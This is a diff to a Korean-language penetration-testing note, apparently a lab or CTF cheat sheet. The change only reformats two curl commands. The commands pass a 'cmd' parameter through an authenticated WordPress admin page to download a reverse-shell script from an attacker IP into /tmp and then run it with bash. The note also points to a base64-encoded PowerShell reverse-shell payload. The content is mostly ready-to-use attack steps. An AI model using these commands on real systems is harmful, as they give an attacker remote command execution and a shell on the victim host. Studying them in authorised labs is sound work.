@@ -26,10 +26,8 @@ python3 -m http.server 80
 URL 공백은 인코딩이 필요하다. 브라우저면 `%20`, curl은 `-G --data-urlencode`로 맡긴다.
 
 ```bash
-curl -b cookie.txt -G "http://target/wp-admin/profile.php" \
-  --data-urlencode "cmd=wget http://10.10.10.10/rev.sh -O /tmp/rev.sh"
-curl -b cookie.txt -G "http://target/wp-admin/profile.php" \
-  --data-urlencode "cmd=bash /tmp/rev.sh"
+curl -b cookie.txt -G "http://target/wp-admin/profile.php" --data-urlencode "cmd=wget http://10.10.10.10/rev.sh -O /tmp/rev.sh"
+curl -b cookie.txt -G "http://target/wp-admin/profile.php" --data-urlencode "cmd=bash /tmp/rev.sh"
 ```
 
 - PowerShell 페이로드는 따옴표 충돌이 심하다 → [windows_powershell_reverse_shell.md](./windows_powershell_reverse_shell.md)의 base64 -enc
